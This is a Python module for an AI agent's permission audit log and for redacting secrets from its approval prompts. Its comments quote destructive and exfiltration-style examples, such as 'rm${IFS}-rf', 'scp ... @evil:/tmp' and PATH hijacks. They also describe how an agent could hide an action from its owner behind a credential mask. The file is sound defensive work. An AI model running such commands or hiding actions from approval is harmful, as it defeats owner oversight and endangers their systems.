"""Permission Audit Logger — persistent trail of security gate decisions.

Every ALLOW/DENY/CONFIRM decision is logged to:
1. SQLite table (queryable history)
2. JSONL file (append-only, grep-able)
3. Standard logger (immediate visibility)

Donor patterns:
- OpenClaw bash-tools.exec-approval-request.ts: structured approval tracking

Source: Prometheus (OAra Labs)
License: MIT
"""

from __future__ import annotations

import json
import logging
import re
import sqlite3
import time
from dataclasses import asdict, dataclass
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Any
from urllib.parse import unquote

logger = logging.getLogger(__name__)


class AuditDecision(Enum):
    ALLOW = "allow"
    DENY = "deny"
    CONFIRM_PENDING = "confirm_pending"
    CONFIRM_APPROVED = "confirm_approved"
    CONFIRM_REJECTED = "confirm_rejected"
    # SPRINT-CONSENT Phase 3/4: an expired request is an OUTCOME, not an
    # absence. Without this row a timeout is indistinguishable from a
    # request nobody ever answered — which is the ambiguity that cost a
    # live probe to resolve.
    CONFIRM_TIMEOUT = "confirm_timeout"


@dataclass
class AuditEntry:
    """A single security gate decision."""

    timestamp: float
    tool_name: str
    decision: AuditDecision
    trust_level: int
    reason: str
    tool_input_summary: str = ""
    user_id: str | None = None
    session_id: str | None = None

    def to_dict(self) -> dict[str, Any]:
        d = asdict(self)
        d["decision"] = self.decision.value
        d["timestamp_iso"] = datetime.fromtimestamp(self.timestamp).isoformat()
        return d

    def to_json(self) -> str:
        return json.dumps(self.to_dict())


class AuditLogger:
    """Persistent audit log for security decisions."""

    # ── Redaction, in two layers ───────────────────────────────────────────
    #
    # LAYER 1 — BY NAME. Precise, cheap, and INCOMPLETE BY CONSTRUCTION. It
    # masks a value because the identifier next to it contains one of five
    # words. Measured against the names this repo actually uses:
    #
    #     DOCS_TOKEN           masked      ("token")
    #     API_KEY              masked      ("api_key")
    #     MY_SECRET            masked      ("secret")
    #     DOCS_ENDPOINT        NOT masked
    #     DOCS_SEED            NOT masked
    #     UPSTREAM_PASSPHRASE  NOT masked  ("passphrase" is not "password")
    #
    # A longer word list moves the boundary; it does not remove it. The next
    # credential will be called something else, and this file already carries
    # the lesson from five name enumerations elsewhere in permissions/.
    # Where a key may START: not inside a word, but ALSO straight after an ESCAPED separator. json.dumps and repr write
    # a newline as the two characters backslash-n and that `n` is a letter, so a key at the start of a line (a heredoc,
    # a key list) had no boundary in front of it and was stored in the clear. The same for escaped tab, CR, \xNN, \uNNNN,
    # \UNNNNNNNN and a URL-encoded %XX. Each alternative is a fixed-width lookbehind.
    _KEY_LEFT = (r'(?:(?<![A-Za-z0-9])'
                 r'|(?<=\\[nrtfv])|(?<=\\x[0-9A-Fa-f]{2})|(?<=\\u[0-9A-Fa-f]{4})|(?<=\\U[0-9A-Fa-f]{8})'
                 r'|(?<=%[0-9A-Fa-f]{2}))')
    _KEY = r'(sk-|pk-|xox[bpas]-|ghp_|gho_)[\w\-]+'
    # An ANSI escape sequence is variable-width, so it cannot be a lookbehind: it is CONSUMED with the key it precedes
    # (the raw ESC character, or the text repr, json.dumps and a shell write for it). With the ESC already stripped by a
    # terminal log only the colour form `[32m` is recognised, so that `[ask-test.txt]` is not read as a sequence and a key.
    _ANSI_KEY = (r'(?:(?:\x1b|\\[xX]1[bB]|\\033|\\e|\\u001[bB])\[[\d;?]*[A-Za-z]'   # with its ESC, any final letter
                 r'|\[[\d;]*m)') + _KEY                                              # ESC already stripped: SGR only

    _NAME_REDACT_PATTERNS: list[tuple[re.Pattern, str]] = [
        (re.compile(r'(api[_-]?key|token|secret|password|auth)["\']?\s*[:=]\s*["\']?[\w\-]+', re.I), r'\1=***'),
        (re.compile(r'Bearer\s+[\w\-\.]+', re.I), 'Bearer ***'),
        # A key starts a word. Without the left boundary `ask-test.txt` matched as `a` + `sk-test` and was stored
        # and shown as `a***.txt`, and so were task-list, disk-usage, risk-notes and desk-plan.
        (re.compile(_ANSI_KEY + '|' + _KEY_LEFT + _KEY), '***'),
    ]

    # LAYER 2 — BY SHAPE. Masks a value because of what the VALUE looks like
    # and where it sits, never because of what it is called. This is the layer
    # that catches DOCS_SEED and UPSTREAM_PASSPHRASE, and it catches the next
    # name nobody has thought of yet for the same reason.
    _SHAPE_REDACT_PATTERNS: list[tuple[re.Pattern, str]] = [
        # URL userinfo: scheme://user:password@host
        # The scheme is BOUNDED, not given a left boundary: an unbounded `[A-Za-z0-9+.-]*` was re-scanned from every letter of a
        # long alphanumeric run (quadratic), and a lookbehind fixed that but stopped the rule matching after a digit, `.`, `-`,
        # `+`, `%XX` or a colour code. A scheme name is short; the output is the same as the unbounded rule's.
        (re.compile(r'([A-Za-z][A-Za-z0-9+.-]{0,31}://)[^/\s:@]+:[^/\s@]+@'), r'\1***:***@'),
        # Any URL query parameter value, whatever the parameter is called.
        # `?access_token=`, `?sig=`, `?X-Amz-Signature=` — a tokenised URL is
        # a credential regardless of the vendor's choice of key name.
        (re.compile(r'([?&][A-Za-z0-9_.\-\[\]]+=)[^&\s"\'>]{8,}'), r'\1***'),
        # An environment-style assignment carrying an opaque value.
        # Shape on BOTH sides: an UPPER_SNAKE identifier (how env vars and
        # secrets are spelled) assigned something long and opaque. Lowercase
        # `--flag=value` and short values are left alone, so ordinary command
        # lines stay readable in the log.
        (re.compile(r'\b([A-Z][A-Z0-9_]{2,})=(["\']?)[A-Za-z0-9+/=_.:\-]{12,}\2'), r'\1=***'),
    ]

    # ── The CONSENT redactor ────────────────────────────────────────────────
    #
    # The approval prompt is read by the owner to decide whether to say yes, and the agent chooses what it shows. The
    # storage redactor above masks by SHAPE as well, and a shape rule cannot tell a secret from a path, a file or a command
    # word: `ls ?a=;rm${IFS}-rf${IFS}~` was shown `ls ?a=***`, `PATH=/tmp/evil:$PATH git status` was shown `PATH=***$PATH
    # git status`, and every patch of a rule found the next way to hide an action behind it. So the prompt uses this smaller
    # set, where a mask covers only a span that the rule itself proves is a credential and that cannot hold shell syntax:
    #   * by NAME (`token=`, `password:` ...), the value running to the first character a credential cannot hold;
    #   * a bearer token (16+ token characters), a key with a known prefix (`sk-`, `ghp_` ...);
    #   * URL userinfo and the values of a URL's query parameters, with a WHITELIST of characters (never a blacklist: a
    #     blacklist let `$IFS` through).
    # NOT here, on purpose: the UPPER_SNAKE=opaque rule and the bare `?name=value` rule. An opaque value in an environment
    # assignment, or a form body, whose name says nothing, is shown to the owner: they are the reader of their own prompt,
    # and a mask that can hide `PYTHONPATH=evil_dir` is a way to hide the action. A value with a character the whitelist does
    # not hold (`$`, a bracket, a quote in a URL password) is shown whole, for the same reason.
    # The name rule. A credential NAME is a keyword, optionally followed by words that extend it (`SECRET_ACCESS_KEY`,
    # `AUTH_KEY`, `SECRET_KEY_BASE`, at most three), or `_key` / `_pwd` / `_pass` / `_sk` / `_pat` (`ENCRYPTION_KEY`,
    # `MYSQL_PWD`, `DB_PASS`, `STRIPE_SK`). It is not preceded by `/` (`PATH=/opt/token:/tmp/evil` is a path list; `PATH=token=a:/tmp/evil` masks only `a`). The value
    # follows the separator, and is NEVER a path (it does not start with `/`, `.` or `~`: a secret is not a path, and
    # `token=/tmp/p.sh; sh $token` must show the script):
    #   `token=abc`                          at once;
    #   `"password":"abc"`                   a QUOTED keyword, then a colon (`PATH=auth:"/tmp/evil"` is not one);
    #   `password: abc`                      a colon and a space or tab (`scp auth:/etc/x`, `https://auth:8080/x` are not);
    #   `api_key = abc`                      a space before the separator (an ini file).
    # NOT masked: `token= rm -rf ~`, `password= x` (an empty assignment, then a command: the command must stay visible).
    _CN_KEYWORD = (r'(?:api[_-]?key|token|secret|passw(?:or)?d|pass[_-]?phrase|seed[_-]?phrase|credentials?|creds?|signature|auth'
                   r'|[_-](?:key|pwd|pass|sk|pat))(?:[_-][A-Za-z0-9]{1,16}){0,3}')
    # A value is one word of credential characters: it never runs on into `@host`, `/path`, `:dir` (`scp x token=a1b2c3d4@evil:/tmp`),
    # except the `base64:` prefix of a framework key (`APP_KEY=base64:...`).
    _CN_VALUE = r'(?![/.~])(?:\d{6,}:[\w\-]{20,}|(?:base64:)?[\w\-.+=%]+(?:/+[\w\-.+=%]+)*)'
    _CONSENT_NAME = re.compile(
        r'(?<!/)(' + _CN_KEYWORD + r')(?:'
        r'[ \t]*:[ \t]+["\']?' + _CN_VALUE +
        r'|["\']?[ \t]+=[ \t]*["\']?' + _CN_VALUE +
        r'|["\']?=["\']?' + _CN_VALUE +
        r')', re.I)
    # A QUOTED key (`"password": "x"`, JSON): the opening quote starts a key, so it follows `{`, `[`, a `,` that follows a value
    # (not a `,` at the start of a word or after `=`, `:`, `$`, `/`) or the start of the text, and any white space / line
    # breaks; `cd "auth":"x1y2z3"`, `PATH=,"auth":"x"` and `PATH="auth":"x"` are shell words of quoted pieces. The key may hold
    # spaces and symbols (`"Client Secret"`, `"db:password"`) but not `=`; the VALUE is quoted too and its closing quote is
    # followed by white space, `,`, the end, or `}` / `]` that is not followed by `:`, `$`, `@`, `/` or a word character (never `:`, `$` or `@` directly: `"auth":"evil1dir9":$PATH` is a word).
    _CONSENT_NAME_QUOTED = re.compile(
        r'(?:^|[{\[]|(?<![\s=:$/,]),)[\s\u23ce]*(["\'])([^"\'\n=]{0,64}?' + _CN_KEYWORD + r')\1[ \t]*:[ \t]*["\']'
        r'(?P<val>' + _CN_VALUE + r')(?=["\'](?:[\s\u23ce,]|$|[}\]](?![:$@/\w])))', re.I)
    # In a URL's query a bare `sig=`, `code=`, `key=`... is a credential as well (`?a=1&sig=...` with no scheme in sight).
    _CONSENT_QNAME = re.compile(
        r'(?<=[?&])(sig|code|key|sid|session|jwt|otp|hmac|ticket|cookie)=(?![/.~])(?:\d{6,}:[\w\-]{20,}|(?:base64:)?[\w\-.+=%]+(?:/+[\w\-.+=%]+)*)', re.I)
    # A bearer token: after `Authorization:` 8+ token characters; anywhere else 12+ with a digit in them (no dots: `Bearer
    # python3.12 x` is a command), or 16+ (`sudo -u Bearer systemctl stop x` and `Bearer rm -rf ~` are not credentials).
    _CONSENT_AUTH_BEARER = re.compile(
        r'(Authorization["\']?[ \t]*[:=][ \t]*["\']?Bearer[ \t]+)(?![/.~])[\w\-.+/=]{8,}', re.I)
    _CONSENT_BEARER = re.compile(
        r'Bearer[ \t]+(?![/.~])(?:(?=[\w\-+/=]*\d)[\w\-+/=]{12,}|[\w\-.+=]{16,})', re.I)
    _CONSENT_USERINFO = re.compile(
        r'([A-Za-z][A-Za-z0-9+.-]{0,31}://)[A-Za-z0-9._~%!+\-=,]+:[A-Za-z0-9._~%!+\-=,:]+@')
    # A word with a `?`, with the quote that opens it and the quote that closes it right after (or none).
    _CONSENT_QS_WORD = re.compile(r'(?<![^\s"\'>])(["\']?)([^\s"\'>?]*\?[^\s"\'>]*)(["\']?)')
    # A URL is a word that STARTS (or follows `=`, `(`, `,`, `<`, `:`, `@`) with a scheme a credential travels by.
    # `a://b?c=...` is a file.
    _CONSENT_URL_START = re.compile(
        r'(?:^|[=(,<:@\[{*])(?:https?|wss?|ftps?|sftp|ssh|git|s3|gs|postgres(?:ql)?|mysql|mariadb|mongodb(?:\+srv)?|rediss?'
        r'|amqps?)://', re.I)
    # A query parameter. The first (after `?`) is masked by its shape. One opened by `&` only inside a QUOTED word (the
    # same quote before and after): an unquoted `&` is a shell operator, and `&my_sig=/tmp/p.sh; sh $my_sig` is not a
    # parameter, whatever the agent calls the variable. A value never starts with `/`, `.` or `~`, never holds `..`, and
    # only has the characters a credential can be proven to hold.
    _CQ_CHARS = r'A-Za-z0-9._%+\-=/:~,!@'
    _CONSENT_QS_PARAM = re.compile(
        r'([?&])([A-Za-z0-9_.\-\[\]]+)(=)(?![/.~])(?=[' + _CQ_CHARS + r'*]{8})(?![' + _CQ_CHARS + r']*\.\.)'
        r'(?:\*{3}|[' + _CQ_CHARS + r'])+')
    _CONSENT_CRED_NAME = re.compile(
        r'(?:token|key|secret|sig|signature|password|passwd|pwd|pw|auth|authorization|code|sid|session_?id|session|jwt|'
        r'credentials?|cred|pass|passcode|passkey|pat|pin|otp|bearer|cookie|ticket|refresh|hmac|assertion|hash|policy|'
        r'salt|seed|dsn)$', re.I)

    # A variable the text USES (`$name`, `${name}`, or its bare name written anywhere else: `printenv name`, `os.environ["name"]`)
    # is part of what will run, so a value assigned to it is never masked: an agent can call a variable anything, and
    # `x_key=payload.sh; sh $x_key` must show the script. Only a value that LOOKS like a secret is masked by name at all (12+
    # characters, or 6+ with a digit; not one that ends in a file extension): `rm`, `payload.sh` and `evil_dir` are not secrets.
    _CONSENT_VAR_REF = re.compile(r'\$\{?([A-Za-z_][A-Za-z0-9_]*)')
    _CONSENT_WORD = re.compile(r'[A-Za-z_][A-Za-z0-9_]*')
    _CONSENT_EXT = re.compile(r'\.[A-Za-z]{1,5}$')

    _CONSENT_B64 = re.compile(r'[A-Za-z0-9+/=]+')
    _CONSENT_BOT = re.compile(r'\d{6,}:[\w\-]{20,}')
    _CONSENT_SNAKE = re.compile(r'[a-z0-9]+(?:_[a-z0-9]+)+')

    _CONSENT_HEX_RUN = re.compile(r'[0-9a-fA-F]{16,}')

    @classmethod
    def _consent_identifier_like(cls, value: str) -> bool:
        """snake_case words (`unlock_front_door_1`): under 24 characters and without a run of 16+ hex digits. A vendor token such as
        `dop_v1_<64 hex>` or `shpat_<32 hex>` is not an identifier."""
        return len(value) < 24 and cls._CONSENT_HEX_RUN.search(value) is None and cls._CONSENT_SNAKE.fullmatch(value) is not None

    @classmethod
    def _consent_secret_like(cls, value: str) -> bool:
        """A value a credential NAME may mask: 6+ characters with a letter and a digit, or 24+ of anything, and not a file name
        or a snake_case identifier (`rm`, `payload.sh`, `shutil.rmtree`, `evil.example.com`, `unlock_front_door_1` and a short
        word are not secrets). A bot token (`123456789:AAH...`) is. A value with a `/` in it (base64: an AWS secret key) must
        be 20+ of the pure base64 alphabet with a letter and a digit: `evil1.example.com/steal.php` is a URL."""
        if cls._CONSENT_BOT.fullmatch(value):
            return True
        if ".." in value or cls._CONSENT_EXT.search(value) or cls._consent_identifier_like(value):
            return False
        if "/" in value:
            return (len(value) >= 20 and cls._CONSENT_B64.fullmatch(value) is not None
                    and any(c.isdigit() for c in value) and any(c.isalpha() for c in value))
        if len(value) >= 24:
            return True
        return len(value) >= 6 and any(c.isdigit() for c in value) and any(c.isalpha() for c in value)

    _CONSENT_OPAQUE = re.compile(r'[A-Za-z0-9_\-+=]{16,}')
    _CONSENT_JWT = re.compile(r'eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}(?:\.[A-Za-z0-9_-]*)?')

    @classmethod
    def _consent_opaque_query_value(cls, value: str) -> bool:
        """A value in a URL query whose NAME says nothing: masked only when it is opaque: a JWT; 16+ of `A-Za-z0-9_-+=` with a
        letter and a digit (not a snake_case word); or, after percent-decoding, 20+ of the base64 alphabet with a letter and a
        digit and no `..`. `?action=delete_all_users`, `?next=evil.example.com`, `?cmd=rm%20-rf%20%2F` and
        `?u=http://169.254.169.254/` are data to show, not secrets."""
        if cls._CONSENT_JWT.fullmatch(value):
            return True
        decoded = unquote(value) if "%" in value else value
        has = any(c.isdigit() for c in decoded) and any(c.isalpha() for c in decoded)
        if cls._CONSENT_OPAQUE.fullmatch(decoded) is not None:
            return has and not cls._consent_identifier_like(decoded)
        return len(decoded) >= 20 and ".." not in decoded and cls._CONSENT_B64.fullmatch(decoded) is not None and has

    @staticmethod
    def _consent_full_name(text: str, start: int, end: int) -> str:
        """The whole identifier a keyword ends: the word characters in front of it, then the keyword and its suffix."""
        while start > 0 and (text[start - 1].isalnum() or text[start - 1] == "_"):
            start -= 1
        return text[start:end]

    class _QuoteScan:
        """Which quote a shell would be inside at a position of the text. Positions are asked in increasing order."""

        def __init__(self, text: str) -> None:
            self.text, self.pos, self.state = text, 0, ""

        def inside(self, pos: int) -> str:
            """The quote character open at *pos* ('' when outside), reading `\\` and the two quote kinds as a shell does."""
            text, state, i = self.text, self.state, self.pos
            while i < pos:
                ch = text[i]
                if ch == "\\" and state != "'":
                    i += 2
                    continue
                if state == "":
                    if ch in "\"'":
                        state = ch
                elif ch == state:
                    state = ""
                i += 1
            self.pos, self.state = i, state
            return state

    @classmethod
    def _consent_query_word(cls, match: re.Match, refs: set[str], scan: "AuditLogger._QuoteScan") -> str:
        """The query values of one URL word that contains a `?`; any other word is left exactly as it is."""
        open_quote, word, close_quote = match.group(1), match.group(2), match.group(3)
        if not cls._CONSENT_URL_START.search(word, 0, word.index("?")):
            return match.group(0)
        # QUOTED: the same quote before and after, the opening one really opens (the shell was outside every quote there),
        # and not an empty pair next to it or an escaped quote (`""https://...""` is a quote, an empty string and an
        # UNQUOTED word to a shell).
        text, begin, end = match.string, match.start(1), match.end(3)
        before = text[begin - 1] if begin > 0 else ""
        after = text[end] if end < len(text) else ""
        quoted = (bool(open_quote) and open_quote == close_quote and open_quote not in (before, after)
                  and before != "\\" and scan.inside(begin) == "")
        # A WHOLE value that is one URL (no shell around it: a `url` argument) has no operators either.
        whole = begin == 0 and end == len(text) and not open_quote

        def param(m: re.Match) -> str:
            name = m.group(2)
            if name in refs:
                return m.group(0)
            value = m.group(0)[len(m.group(1)) + len(name) + 1:]
            named = bool(cls._CONSENT_CRED_NAME.search(name))
            if m.group(1) == "&" and not ((quoted or whole) and named):
                return m.group(0)
            if "***" not in value and not (cls._consent_secret_like(value) if named else cls._consent_opaque_query_value(value)):
                return m.group(0)
            return f"{m.group(1)}{name}{m.group(3)}***"

        return open_quote + cls._CONSENT_QS_PARAM.sub(param, word) + close_quote

    # A key with a known prefix: 20+ characters after it (a real key is 30+). `sk-evil`, `pk-jump` and `./sk-payload` are names.
    _CONSENT_KEY = re.compile(
        r'(?:(?:\x1b|\\[xX]1[bB]|\\033|\\e|\\u001[bB])\[[\d;?]*[A-Za-z]|\[[\d;]*m|' + _KEY_LEFT + r')'
        r'(?:sk-|pk-|xox[bpas]-|ghp_|gho_)[\w\-]{20,}')
    _CONSENT_NAME_ONLY = re.compile(r'[\w.\-]*?(?:' + _CN_KEYWORD + r')', re.I)
    _CONSENT_VALUE_RUN = re.compile(_CN_VALUE)

    @classmethod
    def redact_for_consent(cls, text: str, *, name: str | None = None) -> str:
        """Redact *text* for an approval prompt (see the comment above). Linear in the length of the text.

        *name*: the text is the VALUE of an argument with this name. A name that is itself a credential name (`api_key`,
        `access_token`, `DB_PASS`) masks the run of characters a credential holds at the start of the value, as
        `name=value` would, unless the value is a path, does not look like a secret, or the text uses `$name`."""
        refs = set(cls._CONSENT_VAR_REF.findall(text))
        used: set[str] = set()
        seen: set[str] = set()
        for word in cls._CONSENT_WORD.findall(text):       # a name written twice is used, not just assigned
            (used if word in seen else seen).add(word)
        refs |= used
        if name and name not in refs and cls._CONSENT_NAME_ONLY.fullmatch(name[:256]):
            run = cls._CONSENT_VALUE_RUN.match(text)
            if run and cls._consent_secret_like(run.group(0)):
                text = "***" + text[run.end():]

        def value_match(m: re.Match) -> str:
            return m.group(0)

        def name_sub(m: re.Match) -> str:
            full = cls._consent_full_name(m.string, m.start(1), m.end(1))
            value = m.group(0)[len(m.group(1)):].lstrip(" \t=:\"'")
            if full in refs or not cls._consent_secret_like(value):
                return m.group(0)
            return f"{m.group(1)}=***"

        def qname_sub(m: re.Match) -> str:
            value = m.group(0)[len(m.group(1)) + 1:]
            return m.group(0) if m.group(1) in refs or not cls._consent_secret_like(value) else f"{m.group(1)}=***"

        text = cls._CONSENT_NAME.sub(name_sub, text)
        def quoted_sub(m: re.Match) -> str:
            if m.group(2) in refs or not cls._consent_secret_like(m.group("val")):
                return m.group(0)
            return m.group(0)[:m.start("val") - m.start(0)] + "***"

        text = cls._CONSENT_NAME_QUOTED.sub(quoted_sub, text)
        text = cls._CONSENT_QNAME.sub(qname_sub, text)
        text = cls._CONSENT_AUTH_BEARER.sub(r'\1***', text)
        text = cls._CONSENT_BEARER.sub('Bearer ***', text)
        text = cls._CONSENT_KEY.sub('***', text)
        text = cls._CONSENT_USERINFO.sub(r'\1***:***@', text)
        scan = cls._QuoteScan(text)
        return cls._CONSENT_QS_WORD.sub(lambda m: cls._consent_query_word(m, refs, scan), text)

    #: Applied in order. Name layer first so its nicer `\1=***` replacement
    #: wins on the values it does recognise.
    _REDACT_PATTERNS: list[tuple[re.Pattern, str]] = (
        _NAME_REDACT_PATTERNS + _SHAPE_REDACT_PATTERNS
    )

    def __init__(
        self,
        data_dir: Path,
        max_input_chars: int = 200,
        max_reason_chars: int = 500,
    ) -> None:
        self.data_dir = Path(data_dir)
        self.data_dir.mkdir(parents=True, exist_ok=True)

        self.log_file = self.data_dir / "permission_audit.jsonl"
        self.db_path = self.data_dir / "audit.db"
        self.max_input_chars = max_input_chars
        # Looser than max_input_chars on purpose. A reason is prose written to
        # be read by a human deciding whether to approve, and clipping it at
        # 200 would cut real diagnostics; a tool input is machine payload where
        # the first 200 characters are enough to recognise the call. Both are
        # bounded, which is the property that matters — the number differs
        # because what the two fields are for differs.
        self.max_reason_chars = max_reason_chars

        self._init_db()

    def _init_db(self) -> None:
        """Create audit table if it doesn't exist."""
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("""
                CREATE TABLE IF NOT EXISTS permission_audit (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp REAL NOT NULL,
                    tool_name TEXT NOT NULL,
                    decision TEXT NOT NULL,
                    trust_level INTEGER NOT NULL,
                    reason TEXT,
                    tool_input_summary TEXT,
                    user_id TEXT,
                    session_id TEXT
                )
            """)
            conn.execute(
                "CREATE INDEX IF NOT EXISTS idx_audit_ts ON permission_audit(timestamp DESC)"
            )
            conn.execute(
                "CREATE INDEX IF NOT EXISTS idx_audit_decision ON permission_audit(decision)"
            )
            conn.execute(
                "CREATE INDEX IF NOT EXISTS idx_audit_tool ON permission_audit(tool_name)"
            )

    @classmethod
    def redact(cls, text: str) -> str:
        """Redact potential secrets from text. THE redactor for this system.

        Promoted from the private instance method so the approval prompt can
        reuse it without constructing a logger — see
        ``permissions/argument_view.py``. Deliberately not a copy: both layers
        here are incomplete by construction (the class comment says so at
        length), and a parallel redactor elsewhere would drift from this one
        with nothing to notice the drift.
        """
        for pattern, replacement in cls._REDACT_PATTERNS:
            text = pattern.sub(replacement, text)
        return text

    def _redact(self, text: str) -> str:
        """Redact potential secrets from text before logging."""
        return self.redact(text)

    def _scrub(self, text: str, limit: int) -> str:
        """Redact, then bound. The only way text enters a stored field.

        Truncation is not cosmetic and not a substitute for redaction — it is
        the second half of the same control. Redaction removes what it
        recognises; truncation bounds what it does not, so an unrecognised
        credential in a long command line is at least not stored in full.
        """
        text = self._redact(text)
        if len(text) > limit:
            text = text[:limit] + "..."
        return text

    def _summarize_input(self, tool_input: dict | str | None) -> str:
        """Create truncated, redacted summary of tool input."""
        if tool_input is None:
            return ""

        if isinstance(tool_input, dict):
            text = json.dumps(tool_input)
        else:
            text = str(tool_input)

        return self._scrub(text, self.max_input_chars)

    def log(
        self,
        tool_name: str,
        decision: AuditDecision,
        trust_level: int,
        reason: str,
        tool_input: dict | str | None = None,
        user_id: str | None = None,
        session_id: str | None = None,
    ) -> AuditEntry:
        """Log a security decision to JSONL + SQLite + standard logger."""
        entry = AuditEntry(
            timestamp=time.time(),
            tool_name=tool_name,
            decision=decision,
            trust_level=trust_level,
            # ⚠ REASON IS SCRUBBED, AND THAT USED TO BE `reason=reason`.
            #
            # The gate builds its reason FROM the command:
            #     reason = f"Command requires approval: {command!r}"
            # so the same string reached this method twice — once as
            # `tool_input`, which was redacted and truncated, and once as
            # `reason`, which was neither. A curl with a bearer header and a
            # tokenised URL was stored masked in one column and verbatim in
            # the next, in the same row.
            #
            # System-origin curl / wget / ssh are exactly the commands that
            # reach the approve tier, and exactly the ones carrying
            # credentials. And this is not a write-only log: `audit_query`
            # returns these rows INTO MODEL CONTEXT, so an unredacted reason
            # re-feeds the secret to the model on every later query.
            reason=self._scrub(reason, self.max_reason_chars),
            tool_input_summary=self._summarize_input(tool_input),
            user_id=user_id,
            session_id=session_id,
        )

        # Append to JSONL (append-only, crash-safe)
        try:
            with open(self.log_file, "a") as f:
                f.write(entry.to_json() + "\n")
        except OSError as exc:
            logger.warning("Failed to write audit JSONL: %s", exc)

        # Insert into SQLite
        try:
            with sqlite3.connect(self.db_path) as conn:
                conn.execute(
                    """INSERT INTO permission_audit
                       (timestamp, tool_name, decision, trust_level, reason,
                        tool_input_summary, user_id, session_id)
                       VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
                    (
                        entry.timestamp, entry.tool_name, entry.decision.value,
                        entry.trust_level, entry.reason, entry.tool_input_summary,
                        entry.user_id, entry.session_id,
                    ),
                )
        except sqlite3.Error as exc:
            logger.warning("Failed to write audit SQLite: %s", exc)

        # Standard logger
        level = logging.WARNING if decision == AuditDecision.DENY else logging.INFO
        logger.log(level, "[AUDIT] %s: %s - %s", decision.value.upper(), tool_name, reason)

        return entry

    def query_recent(
        self,
        limit: int = 50,
        decision: AuditDecision | None = None,
        tool_name: str | None = None,
    ) -> list[AuditEntry]:
        """Query recent audit entries from SQLite."""
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row

            query = "SELECT * FROM permission_audit WHERE 1=1"
            params: list[Any] = []

            if decision:
                query += " AND decision = ?"
                params.append(decision.value)

            if tool_name:
                query += " AND tool_name = ?"
                params.append(tool_name)

            query += " ORDER BY timestamp DESC LIMIT ?"
            params.append(limit)

            rows = conn.execute(query, params).fetchall()

        return [
            AuditEntry(
                timestamp=row["timestamp"],
                tool_name=row["tool_name"],
                decision=AuditDecision(row["decision"]),
                trust_level=row["trust_level"],
                reason=row["reason"],
                tool_input_summary=row["tool_input_summary"] or "",
                user_id=row["user_id"],
                session_id=row["session_id"],
            )
            for row in rows
        ]

    def stats(self, hours: int = 24) -> dict[str, int]:
        """Get decision counts for recent period."""
        cutoff = time.time() - (hours * 3600)
        with sqlite3.connect(self.db_path) as conn:
            rows = conn.execute(
                """SELECT decision, COUNT(*) as count
                   FROM permission_audit
                   WHERE timestamp > ?
                   GROUP BY decision""",
                (cutoff,),
            ).fetchall()

        return {row[0]: row[1] for row in rows}
